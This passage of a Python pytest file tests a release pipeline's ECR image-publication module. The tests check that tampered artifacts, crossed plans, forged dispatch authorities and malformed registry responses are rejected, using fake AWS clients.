        f"subject-manifest:{effects[-3].digest}:tag:commit-{COMMIT}"
    )
    descriptors = []
    for index, effect in enumerate(effects):
        path = tmp_path / f"effect-{index}.private"
        descriptor = effect.write_private_file(path)
        descriptors.append(descriptor)
        payload = path.read_bytes()
        assert payload.startswith(image_publication.IMAGE_EFFECT_MAGIC)
        assert b'"payloadBase64"' not in payload
        reconstructed = image_publication.ImagePublicationEffectV1.from_private_file(
            path,
            expected_private_file_sha256=descriptor["sha256"],
            expected_effect_id=effect.effect_id,
            expected_publication_plan_sha256=bundle.plan_sha256,
        )
        assert reconstructed == effect
    assert len({item["effectId"] for item in descriptors}) == len(effects)
    assert len({item["sha256"] for item in descriptors}) == len(effects)
    assert all(item["size"] > item["payloadSize"] for item in descriptors)
    assert all(item["providerSubject"] for item in descriptors)
    assert [item["expectedContent"] for item in descriptors] == [
        effect.digest for effect in effects
    ]


def test_effect_artifact_substitution_is_rejected_before_registry_access(
    tmp_path: Path,
) -> None:
    bundle = _prepare()
    effect = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )[0]
    path = tmp_path / "effect.private"
    descriptor = effect.write_private_file(path)
    payload = bytearray(path.read_bytes())
    payload[-1] ^= 1
    substituted = tmp_path / "substituted.private"
    substituted.write_bytes(payload)

    with pytest.raises(ArtifactSubstitutionError):
        image_publication.ImagePublicationEffectV1.from_private_file(
            substituted,
            expected_private_file_sha256=descriptor["sha256"],
            expected_effect_id=effect.effect_id,
            expected_publication_plan_sha256=bundle.plan_sha256,
        )


def test_referrer_effect_header_cannot_substitute_the_manifest_subject() -> None:
    bundle = _prepare()
    effect = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )[-1]

    with pytest.raises(ArtifactSubstitutionError, match="manifest subject"):
        replace(effect, subject_digest="sha256:" + "f" * 64).validate()


def _release_plan_for_image(bundle) -> ReleasePlanV2:
    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )
    value = deepcopy(_release_plan_v2())
    steps = value["steps"]
    artifacts = value["artifacts"]
    assert isinstance(steps, list)
    assert isinstance(artifacts, list)
    prior_image_steps = [step for step in steps if step["phase"] == "image"]
    prior_paths = {step["requestArtifact"] for step in prior_image_steps}
    insertion = next(
        index for index, step in enumerate(steps) if step["phase"] == "image"
    )
    steps[:] = [step for step in steps if step["phase"] != "image"]
    artifacts[:] = [
        artifact
        for artifact in artifacts
        if artifact["path"] not in prior_paths
    ]
    image_steps: list[dict[str, object]] = []
    for index, effect in enumerate(effects):
        raw = effect.to_private_bytes()
        request_sha256 = hashlib.sha256(raw).hexdigest()
        path = f"build/image-effects/{index:02d}-{effect.effect_id}.private"
        image_steps.append(
            {
                "id": f"image-{index:02d}-{effect.effect_id}",
                "phase": "image",
                "ordinal": 0,
                "kind": "IMAGE_PUBLISH",
                "subject": effect.provider_subject,
                "mutation": True,
                "requestArtifact": path,
                "requestSha256": request_sha256,
                "expectedTemplateSha256": "",
                "expectedTemplateParameterSha256": "",
                "expectedRequestSha256": request_sha256,
                "expectedObservedRequestSha256": "",
                "expectedContentSha256": effect.digest.removeprefix("sha256:"),
            }
        )
        artifacts.append(
            {"path": path, "size": len(raw), "sha256": request_sha256}
        )
    observe_payload = bundle.plan.to_bytes()
    observe_sha256 = hashlib.sha256(observe_payload).hexdigest()
    observe_path = "build/image-publication-plan.json"
    image_steps.append(
        {
            "id": "image-observe-publication-plan",
            "phase": "image",
            "ordinal": 0,
            "kind": "IMAGE_OBSERVE",
            "subject": (
                f"ecr:{ACCOUNT}:{REGION}:repository:personal-operator/bridge:"
                f"release:{COMMIT}"
            ),
            "mutation": False,
            "requestArtifact": observe_path,
            "requestSha256": observe_sha256,
            "expectedTemplateSha256": "",
            "expectedTemplateParameterSha256": "",
            "expectedRequestSha256": observe_sha256,
            "expectedObservedRequestSha256": "",
            "expectedContentSha256": bundle.plan.subject.digest.removeprefix(
                "sha256:"
            ),
        }
    )
    artifacts.append(
        {
            "path": observe_path,
            "size": len(observe_payload),
            "sha256": observe_sha256,
        }
    )
    steps[insertion:insertion] = image_steps
    for ordinal, step in enumerate(steps):
        step["ordinal"] = ordinal
    value["runtimeImageDigest"] = bundle.plan.subject.digest
    value["runtimeImageUri"] = (
        f"{ACCOUNT}.dkr.ecr.{REGION}.amazonaws.com/"
        f"personal-operator/bridge@{bundle.plan.subject.digest}"
    )
    artifacts.sort(key=lambda artifact: artifact["path"])
    return ReleasePlanV2.from_mapping(value)


def _preflight(bundle):
    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )
    release_plan = _release_plan_for_image(bundle)
    plan, authority = image_publication.validate_image_publication_preflight(
        bundle.plan.to_bytes(),
        effects,
        release_plan=release_plan,
    )
    return effects, release_plan, plan, authority


def _retain_present_for_image_test(store, journal):
    assert store is journal.evidence_store
    return _retained_present_evidence(journal, _observation(journal))


@contextmanager
def _verified_image_effect(
    bundle,
    index: int,
) -> Iterator[
    tuple[
        image_publication.ImagePublicationEffectV1,
        VerifiedPrivateMutationV2,
        image_publication.VerifiedImagePublicationPreflightV1,
    ]
]:
    effects, release_plan, _, authority = _preflight(bundle)
    effect = effects[index]
    publish_steps = [
        step
        for step in release_plan.steps
        if step.phase == "image" and step.kind == "IMAGE_PUBLISH"
    ]
    target_step = publish_steps[index]
    with tempfile.TemporaryDirectory(
        prefix="personal-operator-image-effect-test-"
    ) as temporary:
        root = Path(temporary)
        journal = _create_v2(root, release_plan)
        store = journal.evidence_store
        journal.advance_preflight()
        while True:
            step = journal.resume_step()
            assert step is not None
            if step["id"] == target_step.step_id:
                break
            if step["mutation"]:
                journal.begin_step()
                journal.reconcile_step(
                    outcome=_retain_present_for_image_test(store, journal),
                )
            else:
                journal.complete_observation(
                    outcome=_retain_present_for_image_test(store, journal)
                )
        journal.begin_step()
        raw_artifact = effect.to_private_bytes()
        request_path = root / "image-effect.private"
        request_path.write_bytes(raw_artifact)
        envelope_path = root / "private-mutation.bin"
        write_new_private_mutation_envelope(
            envelope_path,
            resolved_request=_resolved_mutation_request(
                journal,
                request_artifact_size=len(raw_artifact),
            ),
            request_artifact_path=request_path,
            plan=release_plan,
            transaction=journal.current,
        )
        with PrivateMutationEnvelopeV2.open_verified(
            envelope_path,
            plan=release_plan,
            transaction=journal.current,
            scratch_dir=root / "scratch",
        ) as verified:
            yield effect, verified, authority


def test_image_preflight_binds_observe_plan_exact_effect_closure_and_steps() -> None:
    bundle = _prepare()
    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )
    release_plan = _release_plan_for_image(bundle)

    plan, authority = image_publication.validate_image_publication_preflight(
        bundle.plan.to_bytes(),
        effects,
        release_plan=release_plan,
    )

    assert plan == bundle.plan
    assert authority.publication_plan_sha256 == bundle.plan_sha256
    assert authority.effect_count == len(effects)
    assert effects[-2].provider_subject == (
        f"ecr:{ACCOUNT}:{REGION}:repository:personal-operator/bridge:"
        f"sbom-referrer-manifest:{effects[-2].digest}:"
        f"subject:{bundle.plan.subject.digest}"
    )
    assert effects[-1].provider_subject == (
        f"ecr:{ACCOUNT}:{REGION}:repository:personal-operator/bridge:"
        f"provenance-referrer-manifest:{effects[-1].digest}:"
        f"subject:{bundle.plan.subject.digest}"
    )


def test_image_preflight_mints_exact_current_aggregate_observe_capability(
    tmp_path: Path,
) -> None:
    bundle = _prepare()
    effects, release_plan, _, authority = _preflight(bundle)
    journal = _create_v2(tmp_path, release_plan)
    journal.advance_preflight()
    _advance_v2_until_phase(journal, "image:IMAGE_OBSERVE")

    observe = authority.bind_current_observe(
        release_plan=release_plan,
        transaction=journal.current,
    )

    assert observe.publication_plan == bundle.plan
    assert observe.ordered_effects == effects
    assert observe.release_plan_sha256 == release_plan.digest()
    assert observe.completed_prefix_sha256 == journal.completed_prefix_sha256()
    assert observe.operation_sha256 == journal.operation_sha256()
    assert observe.step_id == "image-observe-publication-plan"


def test_image_preflight_rejects_noncurrent_or_crossed_aggregate_observe(
    tmp_path: Path,
) -> None:
    bundle = _prepare()
    _, release_plan, _, authority = _preflight(bundle)
    journal = _create_v2(tmp_path, release_plan)
    journal.advance_preflight()

    with pytest.raises(ArtifactSubstitutionError, match="current.*observe"):
        authority.bind_current_observe(
            release_plan=release_plan,
            transaction=journal.current,
        )

    _advance_v2_until_phase(journal, "image:IMAGE_OBSERVE")
    crossed = deepcopy(release_plan.to_mapping())
    crossed["driverSha256"] = "f" * 64
    with pytest.raises(ArtifactSubstitutionError, match="release plan"):
        authority.bind_current_observe(
            release_plan=ReleasePlanV2.from_mapping(crossed),
            transaction=journal.current,
        )


@pytest.mark.parametrize("mutation", ["missing", "extra", "wrong-plan"])
def test_image_preflight_rejects_non_exact_effect_inventory(mutation: str) -> None:
    bundle = _prepare()
    effects = list(
        bundle.publication_effects(expected_plan_sha256=bundle.plan_sha256)
    )
    if mutation == "missing":
        effects.pop(0)
    elif mutation == "extra":
        effects.append(effects[0])
    else:
        effects[0] = replace(
            effects[0], publication_plan_sha256="f" * 64
        )
    release_plan = _release_plan_for_image(bundle)

    with pytest.raises(ArtifactSubstitutionError):
        image_publication.validate_image_publication_preflight(
            bundle.plan.to_bytes(),
            effects,
            release_plan=release_plan,
        )


def test_image_preflight_rejects_valid_but_crossed_blob_effect() -> None:
    bundle = _prepare()
    effects = list(
        bundle.publication_effects(expected_plan_sha256=bundle.plan_sha256)
    )
    original = effects[0]
    payload = b"validly-framed-but-not-plan-bound"
    digest = "sha256:" + hashlib.sha256(payload).hexdigest()
    effects[0] = replace(
        original,
        effect_id="ecr-blob-" + digest.removeprefix("sha256:"),
        digest=digest,
        size=len(payload),
        payload=payload,
    )
    effects[0].validate()
    release_plan = _release_plan_for_image(bundle)

    with pytest.raises(ArtifactSubstitutionError, match="closure"):
        image_publication.validate_image_publication_preflight(
            bundle.plan.to_bytes(),
            effects,
            release_plan=release_plan,
        )


def test_image_preflight_recomputes_observe_plan_digest() -> None:
    bundle = _prepare()
    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )
    release_plan = _release_plan_for_image(bundle)
    plan_mapping = bundle.plan.to_mapping()
    plan_mapping["builderId"] += "/substituted"
    substituted_plan = _json(plan_mapping)

    with pytest.raises(ArtifactSubstitutionError, match="plan digest"):
        image_publication.validate_image_publication_preflight(
            substituted_plan,
            effects,
            release_plan=release_plan,
        )


def test_effect_binder_accepts_only_the_exact_resolved_current_step() -> None:
    bundle = _prepare()
    effect = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )[0]
    resolved = SimpleNamespace(
        mutation_request=SimpleNamespace(
            kind="IMAGE_PUBLISH",
            subject=effect.provider_subject,
        ),
        source_commit=effect.source_commit,
        source_tree=effect.source_tree,
        account=effect.account,
        region=effect.region,
        expected_content_sha256=effect.digest.removeprefix("sha256:"),
    )

    assert (
        image_publication.validate_image_publication_effect_for_release_step(
            effect,
            resolved,
            expected_publication_plan_sha256=bundle.plan_sha256,
        )
        == effect
    )

    resolved.expected_content_sha256 = "f" * 64
    with pytest.raises(ArtifactSubstitutionError, match="release step"):
        image_publication.validate_image_publication_effect_for_release_step(
            effect,
            resolved,
            expected_publication_plan_sha256=bundle.plan_sha256,
        )


class FakeEcrMutation:
    def __init__(self) -> None:
        self.calls: list[tuple[str, dict[str, object]]] = []
        self.partial = False
        self.substitute_manifest = False
        self.collision = False
        self.malformed_stage: str | None = None
        self.layer_response: dict[str, object] | None = None

    def batch_check_layer_availability(self, **kwargs):
        self.calls.append(("batch_check_layer_availability", kwargs))
        if self.layer_response is not None:
            return deepcopy(self.layer_response)
        return {
            "layers": [],
            "failures": [
                {
                    "layerDigest": digest,
                    "failureCode": "MissingLayerDigest",
                    "failureReason": "requested layer is absent",
                }
                for digest in kwargs["layerDigests"]
            ],
        }

    def initiate_layer_upload(self, **kwargs):
        self.calls.append(("initiate_layer_upload", kwargs))
        if self.malformed_stage == "initiate":
            return {"uploadId": "", "partSize": 0}
        return {"uploadId": f"upload-{len(self.calls)}", "partSize": 20_000_000}

    def upload_layer_part(self, **kwargs):
        self.calls.append(("upload_layer_part", kwargs))
        last = kwargs["partLastByte"]
        if self.malformed_stage == "upload":
            return {}
        return {
            "uploadId": kwargs["uploadId"],
            "lastByteReceived": last - 1 if self.partial else last,
            "registryId": ACCOUNT,
            "repositoryName": "personal-operator/bridge",
        }

    def complete_layer_upload(self, **kwargs):
        self.calls.append(("complete_layer_upload", kwargs))
        if self.malformed_stage == "complete":
            return {"uploadId": kwargs["uploadId"], "layerDigest": "sha256:" + "f" * 64}
        return {
            "uploadId": kwargs["uploadId"],
            "layerDigest": kwargs["layerDigests"][0],
            "registryId": ACCOUNT,
            "repositoryName": "personal-operator/bridge",
        }

    def put_image(self, **kwargs):
        self.calls.append(("put_image", kwargs))
        if self.malformed_stage == "put":
            return {"image": {}}
        if self.collision:
            error = RuntimeError("immutable tag collision")
            error.response = {"Error": {"Code": "ImageTagAlreadyExistsException"}}
            raise error
        digest = "sha256:" + hashlib.sha256(
            kwargs["imageManifest"].encode("utf-8")
        ).hexdigest()
        if self.substitute_manifest:
            digest = "sha256:" + "f" * 64
        image_id = {"imageDigest": digest}
        if "imageTag" in kwargs:
            image_id["imageTag"] = kwargs["imageTag"]
        return {
            "image": {
                "registryId": ACCOUNT,
                "repositoryName": "personal-operator/bridge",
                "imageId": image_id,
                "imageManifest": kwargs["imageManifest"],
                "imageManifestMediaType": kwargs["imageManifestMediaType"],
            }
        }


def _publisher(
    client: FakeEcrMutation,
    *,
    account: str = ACCOUNT,
    region: str = REGION,
) -> EcrImagePublisher:
    authority = AttestedAwsClientV2(
        client,
        service="ecr",
        account=account,
        region=region,
        _token=_CLIENT_TOKEN,
    )
    return EcrImagePublisher(authority)


def _publish_effect(
    publisher: EcrImagePublisher,
    verified: VerifiedPrivateMutationV2,
    preflight: object,
) -> ReleaseDispatchAttemptV1:
    fresh_authority, expected_attempt = _fresh_dispatch(verified)
    actual = publisher.publish_effect(
        verified,
        preflight,  # type: ignore[arg-type]
        fresh_authority=fresh_authority,
    )
    assert actual == expected_attempt
    with pytest.raises(DispatchAttemptError, match="already consumed"):
        fresh_authority.consume(
            provider="ECR",
            operation_sha256=expected_attempt.operation_sha256,
            resolved_request_sha256=expected_attempt.resolved_request_sha256,
        )
    return actual


def test_publisher_dispatches_one_exact_blob_or_manifest_effect_per_invocation() -> None:
    bundle = _prepare()
    blob_fake = FakeEcrMutation()

    with _verified_image_effect(bundle, 0) as (
        blob_effect,
        verified,
        preflight,
    ):
        acknowledgement = _publish_effect(
            _publisher(blob_fake), verified, preflight
        )

    assert acknowledgement.provider == "ECR"
    assert acknowledgement.subject == blob_effect.provider_subject
    assert [name for name, _ in blob_fake.calls] == [
        "batch_check_layer_availability",
        "initiate_layer_upload",
        "upload_layer_part",
        "complete_layer_upload",
    ]

    for index in (-3, -2, -1):
        fake = FakeEcrMutation()
        with _verified_image_effect(bundle, index) as (
            effect,
            verified,
            preflight,
        ):
            acknowledgement = _publish_effect(
                _publisher(fake), verified, preflight
            )
        assert acknowledgement.provider == "ECR"
        assert acknowledgement.subject == effect.provider_subject
        assert [name for name, _ in fake.calls] == ["put_image"]
        call = fake.calls[0][1]
        assert call["imageDigest"] == effect.digest
        assert call.get("imageTag") == effect.tag


def test_image_dispatch_fence_rejects_missing_duck_crossed_or_consumed_authority() -> None:
    bundle = _prepare()
    with _verified_image_effect(bundle, -3) as (_, verified, preflight):
        missing_fake = FakeEcrMutation()
        with pytest.raises(TypeError, match="fresh_authority"):
            _publisher(missing_fake).publish_effect(verified, preflight)
        assert missing_fake.calls == []

        crossed_provider, _ = _fresh_dispatch(
            verified, provider="CLOUDFORMATION"
        )
        crossed_operation, _ = _fresh_dispatch(
            verified,
            operation_sha256="sha256:" + "f" * 64,
        )
        crossed_request, _ = _fresh_dispatch(
            verified,
            resolved_request_sha256="e" * 64,
        )
        consumed, consumed_attempt = _fresh_dispatch(verified)
        _, forged_attempt = _fresh_dispatch(verified)
        forged = _ForgedFreshDispatchAuthority(forged_attempt)
        assert consumed.consume(
            provider="ECR",
            operation_sha256=consumed_attempt.operation_sha256,
            resolved_request_sha256=consumed_attempt.resolved_request_sha256,
        ) == consumed_attempt

        for authority in (
            object(),
            crossed_provider,
            crossed_operation,
            crossed_request,
            consumed,
            forged,
        ):
            fake = FakeEcrMutation()
            with pytest.raises(
                ArtifactSubstitutionError,
                match="dispatch authority",
            ):
                _publisher(fake).publish_effect(
                    verified,
                    preflight,
                    fresh_authority=authority,  # type: ignore[arg-type]
                )
            assert fake.calls == []

        with pytest.raises(DispatchAttemptError, match="already consumed"):
            consumed.consume(
                provider="ECR",
                operation_sha256=consumed_attempt.operation_sha256,
                resolved_request_sha256=(
                    consumed_attempt.resolved_request_sha256
                ),
            )


def test_image_blob_dispatch_fence_rejects_forged_authority_before_mutation() -> None:
    bundle = _prepare()
    with _verified_image_effect(bundle, 0) as (_, verified, preflight):
        _, attempt = _fresh_dispatch(verified)
        forged = _ForgedFreshDispatchAuthority(attempt)
        fake = FakeEcrMutation()

        with pytest.raises(
            ArtifactSubstitutionError,
            match="dispatch authority",
        ):
            _publisher(fake).publish_effect(
                verified,
                preflight,
                fresh_authority=forged,
            )

        assert fake.calls == []


def test_publisher_dispatches_one_reconstructed_effect_artifact(
    tmp_path: Path,
) -> None:
    bundle = _prepare()
    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )
    for index, effect in ((0, effects[0]), (-1, effects[-1])):
        path = tmp_path / f"{effect.effect_id}.private"
        descriptor = effect.write_private_file(path)
        reconstructed = image_publication.ImagePublicationEffectV1.from_private_file(
            path,
            expected_private_file_sha256=descriptor["sha256"],
            expected_effect_id=effect.effect_id,
            expected_publication_plan_sha256=bundle.plan_sha256,
        )
        fake = FakeEcrMutation()

        with _verified_image_effect(bundle, index) as (
            bound_effect,
            verified,
            preflight,
        ):
            assert bound_effect == reconstructed
            acknowledgement = _publish_effect(
                _publisher(fake), verified, preflight
            )

        assert acknowledgement.subject == effect.provider_subject
        calls = [name for name, _ in fake.calls]
        if effect.effect_kind == "ECR_BLOB_PUT":
            assert calls == [
                "batch_check_layer_availability",
                "initiate_layer_upload",
                "upload_layer_part",
                "complete_layer_upload",
            ]
        else:
            assert calls == ["put_image"]


def test_publisher_rejects_effect_payload_substitution_before_any_ecr_call() -> None:
    bundle = _prepare()
    effects = list(bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    ))
    effects[0] = replace(
        effects[0], payload=effects[0].payload + b"substituted"
    )
    fake = FakeEcrMutation()

    with pytest.raises(ArtifactSubstitutionError, match="identity"):
        image_publication.validate_image_publication_preflight(
            bundle.plan.to_bytes(),
            effects,
            release_plan=_release_plan_for_image(bundle),
        )

    assert fake.calls == []


def test_partial_layer_upload_is_ambiguous_and_never_publishes_manifests() -> None:
    bundle = _prepare()
    fake = FakeEcrMutation()
    fake.partial = True

    with _verified_image_effect(bundle, 0) as (_, verified, preflight):
        with pytest.raises(ImagePublicationAmbiguous, match="partial"):
            _publish_effect(_publisher(fake), verified, preflight)

    assert "put_image" not in [name for name, _ in fake.calls]


def test_available_blob_is_reconciled_without_a_registry_mutation() -> None:
    bundle = _prepare()
    fake = FakeEcrMutation()
    with _verified_image_effect(bundle, 0) as (
        effect,
        verified,
        preflight,
    ):
        fake.layer_response = {
            "layers": [
                {
                    "layerDigest": effect.digest,
                    "layerAvailability": "AVAILABLE",
                    "layerSize": effect.size,
                    "mediaType": effect.media_type,
                }
            ],
            "failures": [],
        }
        acknowledgement = _publish_effect(
            _publisher(fake), verified, preflight
        )

    assert acknowledgement.provider == "ECR"
    assert [name for name, _ in fake.calls] == [
        "batch_check_layer_availability"
    ]


@pytest.mark.parametrize(
    "response",
    [
        {
            "layers": [],
            "failures": [
                {
                    "layerDigest": "{digest}",
                    "failureCode": "InvalidLayerDigest",
                    "failureReason": "invalid",
                }
            ],
        },
        {
            "layers": [
                {
                    "layerDigest": "{digest}",
                    "layerAvailability": "UNAVAILABLE",
                }
            ],
            "failures": [],
        },
        {
            "layers": [
                {
                    "layerDigest": "{digest}",
                    "layerAvailability": "ARCHIVED",
                }
            ],
            "failures": [],
        },
        {
            "layers": [
                {
                    "layerDigest": "{digest}",
                    "layerAvailability": "AVAILABLE",
                }
            ],
            "failures": [
                {
                    "layerDigest": "{digest}",
                    "failureCode": "MissingLayerDigest",
                }
            ],
        },
        {"layers": [], "failures": []},
    ],
)
def test_layer_reconciliation_fails_closed_on_non_absent_states(response) -> None:
    bundle = _prepare()
    fake = FakeEcrMutation()
    with _verified_image_effect(bundle, 0) as (
        effect,
        verified,
        preflight,
    ):
        fake.layer_response = json.loads(
            json.dumps(response).replace("{digest}", effect.digest)
        )
        with pytest.raises(ImagePublicationError):
            _publish_effect(_publisher(fake), verified, preflight)


def test_immutable_tag_collision_fails_closed_before_referrer_publication() -> None:
    bundle = _prepare()
    fake = FakeEcrMutation()
    fake.collision = True

    with _verified_image_effect(bundle, -3) as (_, verified, preflight):
        with pytest.raises(ImagePublicationCollision, match="collision"):
            _publish_effect(_publisher(fake), verified, preflight)

    assert [name for name, _ in fake.calls].count("put_image") == 1


def test_put_image_response_substitution_is_uncertain_after_mutation() -> None:
    bundle = _prepare()
    fake = FakeEcrMutation()
    fake.substitute_manifest = True

    with _verified_image_effect(bundle, -3) as (_, verified, preflight):
        with pytest.raises(ImagePublicationAmbiguous, match="manifest"):
            _publish_effect(_publisher(fake), verified, preflight)


@pytest.mark.parametrize("stage", ["initiate", "upload", "complete", "put"])
def test_every_malformed_post_mutation_acknowledgement_is_uncertain(stage: str) -> None:
    bundle = _prepare()
    fake = FakeEcrMutation()
    fake.malformed_stage = stage
    index = -3 if stage == "put" else 0

    with _verified_image_effect(bundle, index) as (_, verified, preflight):
        with pytest.raises(ImagePublicationAmbiguous):
            _publish_effect(_publisher(fake), verified, preflight)


def test_publisher_construction_has_no_ambient_ecr_or_credential_access() -> None:
    fake = FakeEcrMutation()
    _publisher(fake)
    assert fake.calls == []


def test_publisher_rejects_a_raw_client_with_a_forgeable_account_marker() -> None:
    fake = FakeEcrMutation()
    fake._personal_operator_attested_account = ACCOUNT

    with pytest.raises(ImagePublicationError, match="authenticated ECR authority"):
        EcrImagePublisher(fake)

    assert fake.calls == []


def test_publisher_rejects_a_free_self_consistent_unplanned_effect() -> None:
    bundle = _prepare()
    effect = replace(
        bundle.publication_effects(
            expected_plan_sha256=bundle.plan_sha256
        )[0],
        publication_plan_sha256="f" * 64,
    )
    effect.validate()
    fake = FakeEcrMutation()

    with pytest.raises(TypeError, match="fresh_authority"):
        _publisher(fake).publish_effect(effect)

    assert fake.calls == []


def test_preflight_authority_is_not_directly_constructible() -> None:
    with pytest.raises(ArtifactSubstitutionError, match="not constructible"):
        image_publication.VerifiedImagePublicationPreflightV1(
            release_plan_sha256="a" * 64,
            publication_plan_sha256="b" * 64,
            effects_by_request_sha256={},
        )


def test_publisher_rejects_preflight_from_a_different_release_plan() -> None:
    bundle = _prepare()
    effects = bundle.publication_effects(
        expected_plan_sha256=bundle.plan_sha256
    )
    crossed_value = _release_plan_for_image(bundle).to_mapping()
    crossed_value["driverSha256"] = "e" * 64
    crossed_plan = ReleasePlanV2.from_mapping(crossed_value)
    _, crossed_preflight = (
        image_publication.validate_image_publication_preflight(
            bundle.plan.to_bytes(),
            effects,
            release_plan=crossed_plan,
        )
    )
    fake = FakeEcrMutation()

    with _verified_image_effect(bundle, 0) as (_, verified, _):
        with pytest.raises(ArtifactSubstitutionError, match="current step"):
            _publish_effect(_publisher(fake), verified, crossed_preflight)

    assert fake.calls == []


def test_publisher_rejects_an_attested_client_for_a_different_account() -> None:
    bundle = _prepare()
    fake = FakeEcrMutation()

    with _verified_image_effect(bundle, 0) as (_, verified, preflight):
        with pytest.raises(ArtifactSubstitutionError, match="ECR authority"):
            _publish_effect(
                _publisher(fake, account="999999999999"),
                verified,
                preflight,
            )

    assert fake.calls == []


PYTHON_BASE = (
    "public.ecr.aws/docker/library/python:3.13-slim@sha256:"
    "7f6f057c60bb4b050500ab319f5fd13f842bf2367b038b7362d1b3e416fa3d9d"
)
NODE_BASE = (
    "public.ecr.aws/docker/library/node:24.15.0-slim@sha256:"
    "4e6b70dd6cbfc88c8157ba19aa3d9f9cce6ba4703576d55459e45efcbc9c5f5d"
)
OPENCLAW_COMMIT = "4bfaccafd62ac2ff2e70ca1decc40fb1297ab438"
OPENCLAW_TREE = "33ee4a213f9b97795ac592b74b82789c5120fab5"


def _toolchain(package_manager: str) -> dict[str, object]:
    value = {
        "platform": "linux/arm64",
        "nodeBaseImage": NODE_BASE,
        "pythonBaseImage": PYTHON_BASE,
        "nodeVersion": "24.15.0",
        "packageManager": package_manager,
        "packageManagerVersion": "10.0.0",
        "packageManagerArtifactSha256": "3" * 64,
    }
    return value


def _material(component: str) -> dict[str, object]:
    if component == "openclaw-runtime":
        distribution_sha512 = hashlib.sha512(
            _test_pnpm_distribution_tar()
        ).hexdigest()
        files = {
            "openclaw.mjs": {"payload": b"openclaw entry", "mode": "0755"},
            "package.json": {
                "payload": _json(
                    {
                        "packageManager": (
                            "pnpm@11.2.2+sha512." + distribution_sha512
                        ),
                        "version": "2026.7.2",
                    }
                ),
                "mode": "0644",
            },
            "pnpm-lock.yaml": {
                "payload": (
                    b"lockfileVersion: '9.0'\n"
                    b"resolution: {integrity: sha512-dGVzdA==}\n"
                ),
                "mode": "0644",
            },
            "dist/runtime.js": {"payload": b"built runtime", "mode": "0644"},
            "node_modules/runtime/index.js": {"payload": b"dependency", "mode": "0644"},
        }
        commit, tree, lock_path, manager = (
            OPENCLAW_COMMIT,
            OPENCLAW_TREE,
            "pnpm-lock.yaml",
            "pnpm",
        )
    else:
        files = {
            "package.json": {"payload": b'{"name":"bridge"}\n', "mode": "0644"},
            "package-lock.json": {
                "payload": _json(
                    {
                        "integrity": "sha512-dGVzdA==",
                        "lockfileVersion": 3,
                    }
                ),
                "mode": "0644",
            },
            "node_modules/@aws-sdk/client-s3/index.js": {
                "payload": b"aws sdk",
                "mode": "0644",
            },
            "node_modules/ws/index.js": {"payload": b"ws", "mode": "0644"},
        }
        commit, tree, lock_path, manager = COMMIT, TREE, "package-lock.json", "npm"
    toolchain = _toolchain(manager)
    lock = files[lock_path]["payload"]
    return {
        "schema": "personal-operator.runtime-build-material.v1",
        "component": component,
        "sourceCommit": commit,
        "sourceTree": tree,
        "lockPath": lock_path,
        "lockSha256": hashlib.sha256(lock).hexdigest(),
        "toolchain": toolchain,
        "toolchainSha256": hashlib.sha256(_json(toolchain)).hexdigest(),
        "dependencyMode": "production",
        "files": files,
    }


def _runtime_source_tar(
    component: str, material: dict[str, object] | None = None
) -> bytes:
    material = material or _material(component)
    output = io.BytesIO()
    with tarfile.open(
        fileobj=output, mode="w", format=tarfile.USTAR_FORMAT
    ) as archive:
        for path in sorted(material["files"]):
            raw = material["files"][path]
            if path.startswith("node_modules/") or path.startswith("dist/"):
                continue
            archive_path = (
                path if component == "openclaw-runtime" else f"bridge/{path}"
            )
            item = tarfile.TarInfo(archive_path)
            item.size = len(raw["payload"])
            item.mode = int(raw["mode"], 8)
            item.uid = item.gid = item.mtime = 0
            archive.addfile(item, io.BytesIO(raw["payload"]))
    return output.getvalue()


class FakeRuntimeSourceExporter:
    def __init__(self) -> None:
        self.calls: list[dict[str, object]] = []
        self.archives = {
            (component, attempt): _runtime_source_tar(component)
            for component in ("openclaw-runtime", "bridge-node-modules")
            for attempt in (1, 2)
        }

    def export_runtime_source(self, **kwargs):
        self.calls.append(kwargs)
        return self.archives[(kwargs["component"], kwargs["attempt"])]


class FakeRuntimeDependencyBuilder:
    def __init__(self) -> None:
        self.calls: list[dict[str, object]] = []
        self.results = {
            (component, attempt): deepcopy(_material(component)["files"])
            for component in ("openclaw-runtime", "bridge-node-modules")
            for attempt in (1, 2)
        }

    def build_runtime(self, **kwargs):
        self.calls.append(kwargs)
        return deepcopy(self.results[(kwargs["component"], kwargs["attempt"])])


def _trusted_runtime_provider():
    exporter = FakeRuntimeSourceExporter()
    builder = FakeRuntimeDependencyBuilder()
    openclaw_artifact = _offline_package_manager_tar(
        "openclaw-runtime",
        _material("openclaw-runtime")["files"]["pnpm-lock.yaml"]["payload"],
    )
    bridge_artifact = _offline_package_manager_tar(
        "bridge-node-modules",
        _material("bridge-node-modules")["files"]["package-lock.json"]["payload"],
    )
    provider = image_publication.TrustedRuntimeBuildMaterialProvider(
        exporter=exporter,
        builder=builder,
        package_manager_artifacts={
            "openclaw-runtime": image_publication.PackageManagerArtifact(
                "pnpm",
                "11.2.2",
                openclaw_artifact,
                hashlib.sha256(openclaw_artifact).hexdigest(),
                hashlib.sha512(_test_pnpm_distribution_tar()).hexdigest(),
            ),
            "bridge-node-modules": image_publication.PackageManagerArtifact(
                "npm",
                "11.12.1",
                bridge_artifact,
                hashlib.sha256(bridge_artifact).hexdigest(),
                "",
            ),
        },
    )
    return provider, exporter, builder


def test_runtime_provider_rejects_self_asserted_package_manager_bytes_before_builder() -> None:
    exporter = FakeRuntimeSourceExporter()
    builder = FakeRuntimeDependencyBuilder()

    with pytest.raises(RuntimeBuildClosureError, match="reviewed.*digest"):
        image_publication.TrustedRuntimeBuildMaterialProvider(
            exporter=exporter,
            builder=builder,
            package_manager_artifacts={
                "openclaw-runtime": image_publication.PackageManagerArtifact(
                    "pnpm",
                    "11.2.2",
                    b"arbitrary executable package-manager bytes",
                    "f" * 64,
                    "d" * 128,
                ),
                "bridge-node-modules": image_publication.PackageManagerArtifact(
                    "npm",
                    "11.12.1",
                    b"arbitrary executable package-manager bytes",
                    "e" * 64,
                    "",
                ),
            },
        )

    assert builder.calls == []

